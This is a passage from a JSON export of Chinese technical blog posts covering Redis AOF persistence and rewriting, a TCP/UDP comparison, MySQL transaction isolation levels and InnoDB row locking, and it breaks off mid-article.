将生成一个新的 AOF 文件， 这个文件包含重建当前数据集所需的最少命令。<br>\nRedis 2.2 需要自己手动执行 bgrewriteaof 命令； Redis 2.4 则可以通过配置自动触发 AOF 重写。</p>\n\n<p><img alt=\"AOF重写\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2ltZy9yZW1vdGUvMTQ2MDAwMDAxNjAyMTIzMQ?x-oss-process=image/format,png\"></p>\n\n<p><strong>AOF重写的作用</strong></p>\n\n<ul><li>减少磁盘占用量</li>\n\t<li>加速数据恢复</li>\n</ul><p><strong>AOF重写的实现方式</strong></p>\n\n<ul><li>\n\t<p><strong>bgrewriteaof 命令</strong></p>\n\n\t<p>Redis bgrewriteaof 命令用于异步执行一个 AOF（AppendOnly File）文件重写操作。重写会创建一个当前AOF文件的体积优化版本。<br>\n\t即使 bgrewriteaof 执行失败，也不会有任何数据丢失，因为旧的AOF文件在 bgrewriteaof 成功之前不会被修改。<br>\n\tAOF 重写由 Redis 自行触发，bgrewriteaof 仅仅用于手动触发重写操作。<br>\n\t具体内容:</p>\n\n\t<ul><li>如果一个子Redis是通过磁盘快照创建的，AOF重写将会在RDB终止后才开始保存。这种情况下BGREWRITEAOF任然会返回OK状态码。从Redis 2.6起你可以通过INFO命令查看AOF重写执行情况。</li>\n\t\t<li>如果只在执行的AOF重写返回一个错误，AOF重写将会在稍后一点的时间重新调用。</li>\n\t</ul></li>\n</ul><p><img alt=\"bgrewriteaof命令\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2ltZy9yZW1vdGUvMTQ2MDAwMDAxNjAyMTIzMg?x-oss-process=image/format,png\"></p>\n\n<ul><li><strong>AOF重写配置</strong></li>\n</ul><table><thead><tr><th>配置名</th>\n\t\t\t<th>含义</th>\n\t\t</tr></thead><tbody><tr><td>auto-aof-rewrite-min-size</td>\n\t\t\t<td>触发AOF文件执行重写的最小尺寸</td>\n\t\t</tr><tr><td>auto-aof-rewrite-percentage</td>\n\t\t\t<td>触发AOF文件执行重写的增长率</td>\n\t\t</tr></tbody></table><table><thead><tr><th>统计名</th>\n\t\t\t<th>含义</th>\n\t\t</tr></thead><tbody><tr><td>aof_current_size</td>\n\t\t\t<td>AOF文件当前尺寸（字节）</td>\n\t\t</tr><tr><td>aof_base_size</td>\n\t\t\t<td>AOF文件上次启动和重写时的尺寸（字节）</td>\n\t\t</tr></tbody></table><blockquote>\n<p>AOF重写自动触发机制，需要同时满足下面两个条件：</p>\n\n<ul><li>aof_current_size &gt; auto-aof-rewrite-min-size</li>\n\t<li>(aof_current_size - aof_base_size) * 100 / aof_base_size &gt; auto-aof-rewrite-percentage</li>\n</ul></blockquote>\n\n<p>假设 Redis 的配置项为：</p>\n\n<pre class=\"has\">\n<code>auto-aof-rewrite-min-size 64mb\nauto-aof-rewrite-percentage 100</code></pre>\n\n<p>当AOF文件的体积大于64Mb，并且AOF文件的体积比上一次重写之久的体积大了至少一倍（100%）时，Redis将执行 bgrewriteaof 命令进行重写。</p>\n\n<p><strong>AOF重写的流程</strong></p>\n\n<p><img alt=\"AOF重写的流程*\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2ltZy9yZW1vdGUvMTQ2MDAwMDAxNjAyMTIzMw?x-oss-process=image/format,png\"></p>\n\n<h3 id=\"articleHeader13\">3. AOF相关配置</h3>\n\n<pre class=\"has\">\n<code># 开启AOF持久化方式\nappendonly yes\n\n# AOF持久化文件名\nappendfilename appendonly-&lt;port&gt;.aof\n\n# 每秒把缓冲区的数据同步到磁盘\nappendfsync everysec\n\n# 数据持久化文件存储目录\ndir /var/lib/redis\n\n# 是否在执行重写时不同步数据到AOF文件\n# 这里的 yes，就是执行重写时不同步数据到AOF文件\nno-appendfsync-on-rewrite yes\n\n# 触发AOF文件执行重写的最小尺寸\nauto-aof-rewrite-min-size 64mb\n\n# 触发AOF文件执行重写的增长率\nauto-aof-rewrite-percentage 100</code></pre>\n\n<h3 id=\"articleHeader14\">4. AOF的优点</h3>\n\n<ol><li>使用AOF 会让你的Redis更加耐久: 你可以使用不同的fsync策略：无fsync，每秒fsync，每次写的时候fsync。使用默认的每秒fsync策略，Redis的性能依然很好(fsync是由后台线程进行处理的，主线程会尽力处理客户端请求)，一旦出现故障，你最多丢失1秒的数据。</li>\n\t<li>AOF文件是一个只进行追加的日志文件，所以不需要写入seek，即使由于某些原因(磁盘空间已满，写的过程中宕机等等)未执行完整的写入命令，你也也可使用redis-check-aof工具修复这些问题。</li>\n\t<li>Redis 可以在 AOF 文件体积变得过大时，自动地在后台对 AOF 进行重写： 重写后的新 AOF 文件包含了恢复当前数据集所需的最小命令集合。 整个重写操作是绝对安全的，因为 Redis 在创建新 AOF 文件的过程中，会继续将命令追加到现有的 AOF 文件里面，即使重写过程中发生停机，现有的 AOF 文件也不会丢失。 而一旦新 AOF 文件创建完毕，Redis 就会从旧 AOF 文件切换到新 AOF 文件，并开始对新 AOF 文件进行追加操作。</li>\n\t<li>AOF 文件有序地保存了对数据库执行的所有写入操作， 这些写入操作以 Redis 协议的格式保存， 因此 AOF 文件的内容非常容易被人读懂， 对文件进行分析（parse）也很轻松。 导出（export） AOF 文件也非常简单： 举个例子， 如果你不小心执行了 FLUSHALL 命令， 但只要 AOF 文件未被重写， 那么只要停止服务器， 移除 AOF 文件末尾的 FLUSHALL 命令， 并重启 Redis ， 就可以将数据集恢复到 FLUSHALL 执行之前的状态。</li>\n</ol><h3 id=\"articleHeader15\">5. AOF的缺点</h3>\n\n<ol><li>对于相同的数据集来说，AOF 文件的体积通常要大于 RDB 文件的体积。</li>\n\t<li>根据所使用的 fsync 策略，AOF 的速度可能会慢于 RDB 。 在一般情况下， 每秒 fsync 的性能依然非常高， 而关闭 fsync 可以让 AOF 的速度和 RDB 一样快， 即使在高负荷之下也是如此。 不过在处理巨大的写入载入时，RDB 可以提供更有保证的最大延迟时间（latency）。</li>\n</ol><h2 id=\"articleHeader16\">四、RDB和AOF的抉择</h2>\n\n<h3 id=\"articleHeader17\">1. RDB 和 AOF 对比</h3>\n\n<table><thead><tr><th>-</th>\n\t\t\t<th>RDB</th>\n\t\t\t<th>AOF</th>\n\t\t</tr></thead><tbody><tr><td>启动优先级</td>\n\t\t\t<td>低</td>\n\t\t\t<td>高</td>\n\t\t</tr><tr><td>体积</td>\n\t\t\t<td>小</td>\n\t\t\t<td>大</td>\n\t\t</tr><tr><td>恢复速度</td>\n\t\t\t<td>快</td>\n\t\t\t<td>慢</td>\n\t\t</tr><tr><td>数据安全性</td>\n\t\t\t<td>丢数据</td>\n\t\t\t<td>根据策略决定</td>\n\t\t</tr></tbody></table><h3 id=\"articleHeader18\">2. 如何选择使用哪种持久化方式？</h3>\n\n<p>一般来说， 如果想达到足以媲美 PostgreSQL 的数据安全性， 你应该同时使用两种持久化功能。</p>\n\n<p>如果你非常关心你的数据， 但仍然可以承受数分钟以内的数据丢失， 那么你可以只使用 RDB 持久化。</p>\n\n<p>有很多用户都只使用 AOF 持久化， 但并不推荐这种方式： 因为定时生成 RDB 快照（snapshot）非常便于进行数据库备份， 并且 RDB 恢复数据集的速度也要比 AOF 恢复的速度要快。</p>\n                                    </div>", "log_PostTime": 1584891166, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "TCP/UDP对比总结", "log_Intro": "TCP/UDP对比总结", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>在计算机网络中，有三种体系结构划分方式，第一种是OSI七层协议体系结构，由上到下分别是：应用层，表示层，会话层，运输层，网络层，数据链路层，物理层；第二种是TCP/IP四层协议，由上到下分别是：应用层，运输层，网际层，网络接口层。第一种划分方式复杂又不实用，第二种划分方式最下面“网络接口层”对计算机网络来说，和一般的通信链路没有多大的区别，所以最后折中为我们常用的五层协议：应用层，运输层，网络层，数据链路层，物理层。<br>\n  运输层向它上面的应用层提供服务，它属于面向通信部分的最高层，同时也是用户功能的最底层。两个主机通过核心网络进行端到端通信时，只有主机部分有运输层，核心网络部分的路由在转发分组时只用到下面三层。<br>\n  TCP/UDP作为传输层协议，各自都有着非常广泛的应用场景，下面先对这两种协议做一个简单对比，然后分别介绍下这两种协议。本文仅从原理上介绍两种协议，暂并不涉及编程。</p>\n\n<h1 id=\"tcp-udp对比\">1 TCP-UDP对比</h1>\n\n<p>  <strong>相同点：</strong><br>\n  TCP和UDP都是网络层之上的，传输层协议，都能都能保护网络层的传输，双方的通信都需要开放端口，TCP和UDP中都存在<strong>复用</strong>和<strong>分用</strong>技术。<br>\n  <strong>不同点：</strong><br>\n  一提到TCP-UDP的区别，大家最容易想到的便是TCP是可靠传输的，UDP是不可靠传输的，下面就简单罗列一下：</p>\n\n<table><thead><tr><th>选项</th>\n\t\t\t<th>TCP</th>\n\t\t\t<th>UDP</th>\n\t\t</tr></thead><tbody><tr><td>可靠性</td>\n\t\t\t<td>全双工可靠传输无差错，不丢失，不重复，且按序到达</td>\n\t\t\t<td>尽最大努力交付</td>\n\t\t</tr><tr><td>建立连接</td>\n\t\t\t<td>需要建立连接</td>\n\t\t\t<td>无需建立连接</td>\n\t\t</tr><tr><td>数据发送模式</td>\n\t\t\t<td>面向字节流</td>\n\t\t\t<td>面向报文</td>\n\t\t</tr><tr><td>传输方式</td>\n\t\t\t</tr></tbody></table>                                    </div>", "log_PostTime": 1584891167, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "MySQL的四种事务隔离级别", "log_Intro": "MySQL的四种事务隔离级别", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p><strong>本文实验的测试环境：Windows 10+cmd+MySQL5.6.36+InnoDB</strong></p>\n\n<h1><strong>一、事务的基本要素（ACID）</strong></h1>\n\n<p><strong>　　</strong><strong>1、原子性（Atomicity）：事务开始后所有操作，要么全部做完，要么全部不做，不可能停滞在中间环节。事务执行过程中出错，会回滚到事务开始前的状态，所有的操作就像没有发生一样。也就是说事务是一个不可分割的整体，就像化学中学过的原子，是物质构成的基本单位。</strong></p>\n\n<p><strong>　　 </strong><strong>2、一致性（Consistency）：事务开始前和结束后，数据库的完整性约束没有被破坏 。比如A向B转账，不可能A扣了钱，B却没收到。</strong></p>\n\n<p><strong>　　 3、隔离性（Isolation）：同一时间，只允许一个事务请求同一数据，不同的事务之间彼此没有任何干扰。比如A正在从一张银行卡中取钱，在A取钱的过程结束前，B不能向这张卡转账。</strong></p>\n\n<p><strong>　　 4、持久性（Durability）：事务完成后，事务对数据库的所有更新将被保存到数据库，不能回滚。</strong></p>\n\n<p> </p>\n\n<h1><strong>二、事务的并发问题</strong></h1>\n\n<p><strong>　　1、脏读：</strong>事务A读取了事务B更新的数据，然后B回滚操作，那么A读取到的数据是脏数据</p>\n\n<p><strong>　　2、不可重复读：</strong>事务 A 多次读取同一数据，事务 B 在事务A多次读取的过程中，对数据作了更新并提交，导致事务A多次读取同一数据时，结果 不一致。</p>\n\n<p><strong>　　3、幻读：</strong>系统管理员A将数据库中所有学生的成绩从具体分数改为ABCDE等级，但是系统管理员B就在这个时候插入了一条具体分数的记录，当系统管理员A改结束后发现还有一条记录没有改过来，就好像发生了幻觉一样，这就叫幻读。</p>\n\n<p><strong>　　小结：</strong>不可重复读的和幻读很容易混淆，不可重复读侧重于修改，幻读侧重于新增或删除。解决不可重复读的问题只需锁住满足条件的行，解决幻读需要锁表</p>\n\n<p> </p>\n\n<h1>三、MySQL事务隔离级别</h1>\n\n<table border=\"0\"><tbody><tr><td>事务隔离级别</td>\n\t\t\t<td>脏读</td>\n\t\t\t<td>不可重复读</td>\n\t\t\t<td>幻读</td>\n\t\t</tr><tr><td>读未提交（read-uncommitted）</td>\n\t\t\t<td>是</td>\n\t\t\t<td>是</td>\n\t\t\t<td>是</td>\n\t\t</tr><tr><td>不可重复读（read-committed）</td>\n\t\t\t<td>否</td>\n\t\t\t<td>是</td>\n\t\t\t<td>是</td>\n\t\t</tr><tr><td>可重复读（repeatable-read）</td>\n\t\t\t<td>否</td>\n\t\t\t<td>否</td>\n\t\t\t<td>是</td>\n\t\t</tr><tr><td>串行化（serializable）</td>\n\t\t\t<td>否</td>\n\t\t\t<td>否</td>\n\t\t\t<td>否</td>\n\t\t</tr></tbody></table><p><strong>mysql默认的事务隔离级别为repeatable-read</strong></p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE1LmNuYmxvZ3MuY29tL2Jsb2cvMTE4Mzc5NC8yMDE3MDYvMTE4Mzc5NC0yMDE3MDYxNTIyMjM1ODU0MC05NzgzODM3MzQucG5n?x-oss-process=image/format,png\"></p>\n\n<p> </p>\n\n<h1>四、用例子说明各个隔离级别的情况</h1>\n\n<h3>1、读未提交：</h3>\n\n<p>（1）打开一个客户端A，并设置当前事务模式为read uncommitted（未提交读），查询表account的初始值：</p>\n\n<p> <img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE1LmNuYmxvZ3MuY29tL2Jsb2cvMTE4Mzc5NC8yMDE3MDYvMTE4Mzc5NC0yMDE3MDYxNTIyNTkzOTA4Ny0zNjc3NzYyMjEucG5n?x-oss-process=image/format,png\"></p>\n\n<p>（2）在客户端A的事务提交之前，打开另一个客户端B，更新表account：</p>\n\n<p> <img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE1LmNuYmxvZ3MuY29tL2Jsb2cvMTE4Mzc5NC8yMDE3MDYvMTE4Mzc5NC0yMDE3MDYxNTIzMDIxODMwNi04NjIzOTk0MzgucG5n?x-oss-process=image/format,png\"></p>\n\n<p> </p>\n\n<p>（3）这时，虽然客户端B的事务还没提交，但是客户端A就可以查询到B已经更新的数据：</p>\n\n<p> <img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE1LmNuYmxvZ3MuY29tL2Jsb2cvMTE4Mzc5NC8yMDE3MDYvMTE4Mzc5NC0yMDE3MDYxNTIzMDQyNzc5MC0yMDU5MjUxNDEyLnBuZw?x-oss-process=image/format,png\"></p>\n\n<p>（4）一旦客户端B的事务因为某种原因回滚，所有的操作都将会被撤销，那客户端A查询到的数据其实就是脏数据：</p>\n\n<p> <img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE1LmNuYmxvZ3MuY29tL2Jsb2cvMTE4Mzc5NC8yMDE3MDYvMTE4Mzc5NC0yMDE3MDYxNTIzMDY1NTQwMC0xMDE4MjUyMTIwLnBuZw?x-oss-process=image/format,png\"></p>\n\n<p>（5）在客户端A执行更新语句update account set balance = balance - 50 where id =1，lilei的balance没有变成350，居然是400，是不是很奇怪，数据不一致啊，如果你这么想就太天真 了，在应用程序中，我们会用400-50=350，并不知道其他会话回滚了，要想解决这个问题可以采用读已提交的隔离级别</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE1LmNuYmxvZ3MuY29tL2Jsb2cvMTE4Mzc5NC8yMDE3MDYvMTE4Mzc5NC0yMDE3MDYxNjIwMzgxNTE4MS0xMDIzMDQ4Njk5LnBuZw?x-oss-process=image/format,png\"></p>\n\n<p> </p>\n\n<h3>2、读已提交</h3>\n\n<p>（1）打开一个客户端A，并设置当前事务模式为read committed（未提交读），查询表account的所有记录：</p>\n\n<p> <img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE1LmNuYmxvZ3MuY29tL2Jsb2cvMTE4Mzc5NC8yMDE3MDYvMTE4Mzc5NC0yMDE3MDYxNTIzMTQzNzM1My0xNDQxMzYxNjU5LnBuZw?x-oss-process=image/format,png\"></p>\n\n<p>（2）在客户端A的事务提交之前，打开另一个客户端B，更新表account：</p>\n\n<p> <img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE1LmNuYmxvZ3MuY29tL2Jsb2cvMTE4Mzc5NC8yMDE3MDYvMTE4Mzc5NC0yMDE3MDYxNTIzMTkyMDY5Ni00ODA4MTA5NC5wbmc?x-oss-process=image/format,png\"></p>\n\n<p>（3）这时，客户端B的事务还没提交，客户端A不能查询到B已经更新的数据，解决了脏读问题：</p>\n\n<p> <img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE1LmNuYmxvZ3MuY29tL2Jsb2cvMTE4Mzc5NC8yMDE3MDYvMTE4Mzc5NC0yMDE3MDYxNTIzMjIwMzk3OC0xNzk2MzE5NzcucG5n?x-oss-process=image/format,png\"></p>\n\n<p>（4）客户端B的事务提交</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE1LmNuYmxvZ3MuY29tL2Jsb2cvMTE4Mzc5NC8yMDE3MDYvMTE4Mzc5NC0yMDE3MDYxNTIzMjUwNjY1MC0xNjc3MjIzNzYxLnBuZw?x-oss-process=image/format,png\"></p>\n\n<p>（5）客户端A执行与上一步相同的查询，结果 与上一步不一致，即产生了不可重复读的问题</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE1LmNuYmxvZ3MuY29tL2Jsb2cvMTE4Mzc5NC8yMDE3MDYvMTE4Mzc5NC0yMDE3MDYxNTIzMjc0ODMzNy0yMDkyOTI0NTk4LnBuZw?x-oss-process=image/format,png\"></p>\n\n<p> </p>\n\n<h3>3、可重复读</h3>\n\n<p>（1）打开一个客户端A，并设置当前事务模式为repeatable read，查询表account的所有记录</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE1LmNuYmxvZ3MuY29tL2Jsb2cvMTE4Mzc5NC8yMDE3MDYvMTE4Mzc5NC0yMDE3MDYxNTIzMzMyMDI5MC0xODQwNDg3Nzg3LnBuZw?x-oss-process=image/format,png\"></p>\n\n<p>（2）在客户端A的事务提交之前，打开另一个客户端B，更新表account并提交</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE1LmNuYmxvZ3MuY29tL2Jsb2cvMTE4Mzc5NC8yMDE3MDYvMTE4Mzc5NC0yMDE3MDYxNTIzMzUyNjEwMy0xNDk1OTg5NjAxLnBuZw?x-oss-process=image/format,png\"></p>\n\n<p>（3）在客户端A查询表account的所有记录，与步骤（1）查询结果一致，没有出现不可重复读的问题</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE1LmNuYmxvZ3MuY29tL2Jsb2cvMTE4Mzc5NC8yMDE3MDYvMTE4Mzc5NC0yMDE3MDYxNTIzMzg1ODA4Ny0xMDAwNzk0OTQ5LnBuZw?x-oss-process=image/format,png\"></p>\n\n<p>（4）在客户端A，接着执行update balance = balance - 50 where id = 1，balance没有变成400-50=350，lilei的balance值用的是步骤（2）中的350来算的，所以是300，数据的一致性倒是没有被破坏。可重复读的隔离级别下使用了MVCC机制，select操作不会更新版本号，是快照读（历史版本）；insert、update和delete会更新版本号，是当前读（当前版本）。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvMTE4Mzc5NC8yMDE4MDkvMTE4Mzc5NC0yMDE4MDkwMzAxNDc0NzU4MS0xNTcwNDMxMzM1LnBuZw?x-oss-process=image/format,png\"></p>\n\n<p>（5）重新打开客户端B，插入一条新数据后提交</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvMTE4Mzc5NC8yMDE4MDkvMTE4Mzc5NC0yMDE4MDkwMzAxNTIwMjk1OC02MjU4NzU2MDgucG5n?x-oss-process=image/format,png\"></p>\n\n<p>（6）在客户端A查询表account的所有记录，没有 查出 新增数据，所以没有出现幻读</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvMTE4Mzc5NC8yMDE4MDkvMTE4Mzc5NC0yMDE4MDkwMzAxNTUwMTQxOC0xNjA2MTI3Mzc3LnBuZw?x-oss-process=image/format,png\"></p>\n\n<p> </p>\n\n<p>　4.串行化</p>\n\n<p>（1）打开一个客户端A，并设置当前事务模式为serializable，查询表account的初始值 </p>\n\n<p>（2）打开一个客户端B，并设置当前事务模式为serializable，插入一条记录报错，表被锁了插入失败，mysql中事务隔离级别为serializable时会锁表，因此不会出现幻读的情况，这种隔离级别并发性极低，开发中很少会用</p>\n\n<p> </p>\n\n<p>　　<strong>补充：</strong></p>\n\n<p><strong>　　1、事务隔离级别为读提交时，写数据只会锁住相应的行</strong></p>\n\n<p><strong>　　2<strong>、事务隔离级别为可重复读时，如果检索条件有索引（包括主键索引）的时候，默认加锁方式是next-key 锁；如果<strong><strong>检索条件</strong></strong>没有索引，更新数据时会锁住整张表。一个间隙被事务加了锁，其他事务是不能在这个间隙插入记录的，这样可以防止幻读。</strong></strong></p>\n\n<p><strong>　　3、事务隔离级别为串行化时，读写数据都会锁住整张表</strong></p>\n\n<p><strong>　　 4<strong>、隔离级别越高，越能保证数据的完整性和一致性，但是对并发性能的影响也越大。</strong></strong></p>\n\n<p><strong><strong>　　 5、MYSQL MVCC实现机制参考链接：<a href=\"https://blog.csdn.net/whoamiyang/article/details/51901888\">https://blog.csdn.net/whoamiyang/article/details/51901888</a></strong></strong></p>\n\n<p><strong><strong>　　 6、关于<strong><strong>next-key 锁可以参考链接：<a href=\"https://blog.csdn.net/bigtree_3721/article/details/73731377\">https://blog.csdn.net/bigtree_3721/article/details/73731377</a></strong></strong></strong></strong></p>\n                                    </div>", "log_PostTime": 1584891168, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Mysql锁专题：InnoDB锁概述", "log_Intro": "Mysql锁专题：InnoDB锁概述", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1>一 概述</h1>\n\n<p><strong>InnoDB与MyISAM有两处不同：</strong><br>\n1）InnoDB支持事务；<br>\n2）默认采用行级锁（也可以支持表级锁）</p>\n\n<p><strong>对于更新操作（UPDATE、INSERT、DELETE），InnoDB会自动给涉及到的数据集加排他锁（X）；对于普通的SELECT语句，InnoDB不加任何锁（所以即使有一个线程的写操作在占用锁，不影响其他线程的读，但是如果某个线程试图加共享锁则不行）。</strong></p>\n\n<p><strong>InnoDB的行锁模式及加锁方法</strong><br>\nInnoDB实现了以下两种类型的行锁。<br>\n共享锁(S)：允许一个事务去读一行，阻止其他事务获得相同数据集的排他锁；<br>\n排他锁(X)：允许获得排他锁的事务更新数据，阻止其他事务获得相同数据集的共享读锁和排他写锁。</p>\n\n<p>另外，为了允许行锁和表锁共存，InnoDB还有两张内部使用的意向锁，都是表锁：<br>\n意向共享锁(IS)：事务打算给数据行加行共享锁，事务在给一个数据行加共享锁前先必须取得该表的意向共享锁；<br>\n意向排他锁(IX)：事务打算给数据行加行排他锁，事务在给一个数据行加排他锁前必须先取得该表的意向排他锁。<br>\n上述几种锁的兼容性如下：<br>\n表20-6 InnoDB行锁模式兼容性列表</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191020154253560.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"><br>\n如果一个事务请求的锁模式与当前的锁兼容，InnoDB就将请求的锁授予该事务；反之，如果两者不兼容，该事务就要等待锁释放。<br>\n意向锁是InnoDB自动加的，不需用户干预。<br>\n对于更新操作（UPDATE、INSERT、DELETE），InnoDB会自动给涉及到的数据集加排他锁（X）；对于普通的SELECT语句，InnoDB不加任何锁（所以即使有一个线程的写操作在占用锁，不影响其他线程的读，但是如果某个线程试图加共享锁则不行）。</p>\n\n<p><strong>显式的给记录集加共享锁：</strong><br>\n共享锁： SELECT * FROM tableName WHERE …. LOCK IN SHARE MODE<br>\n排他锁： SELECT * FROM tableName WHERE …. FOR UPDATE</p>\n\n<h1>二、 共享锁中执行update操作容易导致死锁</h1>\n\n<p>注意：**用共享锁然后执行了update操作，则有可能和别的线程的update操作发生锁冲突，从而死锁。死锁后Mysql会自动关闭一个线程的事务操作，让锁被一个线程使用。**如下所示：<br>\n1）线程A和线程B对同一行记录使用了共享锁，两个线程读都没有问题（读不需要加锁，不管当前记录加了共享锁还是排他锁，都不影响单独的读操作）；<br>\n2）线程A进行更新操作，因为更新操作需要加独占锁，而线程B还对当前记录保留了共享锁，故线程A无法获得当前线程的独占锁，要等待线程B释放共享锁；<br>\n3）线程B也进行了更新操作，它也要对当前记录加独占锁。那么显然它也无法获得到该记录的独占锁，两个线程都会等待下去，也就是死锁。<br>\n4）此时Mysql会自动根据一定规则把锁交给某个线程，另一个线程失去锁重新启动事务。<br>\n另外，注意，默认情况下单行执行后就会自动提交事务，此时锁也就被自动释放了。需要关闭事务的自动提交。<br>\nset autocommit = 0;</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovL3d3dy5waWFuc2hlbi5jb20vaW1hZ2VzLzY1Ny9iZWQzZjU1NDdjOGExYWEwMTM2ZGQ5MWRhMGYyMDE4OS5wbmc?x-oss-process=image/format,png\"></p>\n\n<p>对于需要更新的操作，应当直接使用排他锁。这种情况下，因为线程A已经占有了排他锁，线程B无法获得共享锁和排他锁，只能等待。但是注意，InnoDB的读操作不需要加锁，所以可以照常的读。<br>\n当使用SELECT…FOR UPDATE加锁后再更新记录，出现如表20-8所示的情况。<br>\n表20-8 InnoDB存储引擎的排他锁例子<img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovL3d3dy5waWFuc2hlbi5jb20vaW1hZ2VzLzk5OC83NTFlZTZmOTVmYTI4ZmZhNWJlNDlhODVmZmNiNmY2Ni5wbmc?x-oss-process=image/format,png\"></p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/2019102015482755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<h1>三、 InnodDB行锁实现方式</h1>\n\n<p><strong>InnoDB行锁是通过给索引上的索引项加锁来实现的。这一点Mysql和Oracle不同，Oracle是通过直接在数据块中对相应数据行加锁来实现的。<br>\nInnoDB的这种特性意味着：只有通过索引条件检索数据，InnoDB才使用行级锁；否则InnoDB将使用表锁。</strong></p>\n\n<p><strong>1）非索引字段加锁变成表锁</strong><br>\n表20-9 InnoDB存储引擎的表在不使用索引时使用表锁例子<img alt=\"2660156a08714a61bafa077271c18963.png\" class=\"preview\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovL3d3dy5waWFuc2hlbi5jb20vaW1hZ2VzLzk0Ny8yNjYwMTU2YTA4NzE0YTYxYmFmYTA3NzI3MWMxODk2My5wbmc?x-oss-process=image/format,png\"><br>\n注意，对于表没有加索引，<strong>线程A仅要求获取id=1的记录的独占锁，但是因为没有加索引，所以该语句锁住了整个表，使用了表锁。</strong></p>\n\n<p>当我们对id行添加索引<br>\nalter table tab_with_index add index id(id);<br>\n则会有下面的例子：<br><img alt=\"364a8d27416c66a8d8925f36c97c3ab9.png\" class=\"preview\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovL3d3dy5waWFuc2hlbi5jb20vaW1hZ2VzLzI2NS8zNjRhOGQyNzQxNmM2NmE4ZDg5MjVmMzZjOTdjM2FiOS5wbmc?x-oss-process=image/format,png\"><br><strong>2）相同索引键导致阻塞</strong></p>\n\n<p>由于Mysql的行锁是针对索引加的锁，而不是针对记录加的，所以即使是访问不同行，但是如果使用了相同的索引键，依然会冲突：<br>\nmysql&gt; select * from tab_with_index where id = 1;<br>\n±-----±-----+<br>\n| id | name |<br>\n±-----±-----+<br>\n| 1 | 1 |<br>\n| 1 | 4 |<br>\n±-----±-----+<br>\n例如对于上表，如果对id加了索引，但是有两个记录的id相同，也就是索引相同。此时两个线程分别试图获取两个记录的独占锁依然会导致阻塞，因为mysql的行锁是加在索引上的。<br><img alt=\"ac5f29882f83ccb221772a383db5df79.png\" class=\"preview\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovL3d3dy5waWFuc2hlbi5jb20vaW1hZ2VzLzM4NS9hYzVmMjk4ODJmODNjY2IyMjE3NzJhMzgzZGI1ZGY3OS5wbmc?x-oss-process=image/format,png\"><br><strong>3）不同索引键指向同一行记录也会导致阻塞</strong></p>\n\n<p>mysql&gt; alter table tab_with_index add index name(name);<br>\nalter table tab_with_index add index id(id);</p>\n\n<p>假设我们分别对id和name增加索引，<strong>那么不管是什么索引，InnoDB都会使用行锁来锁定不同的行。</strong><br><img alt=\"4c6c9d5b8f32f71ae2d7599a37b3bc75.png\" class=\"preview\" 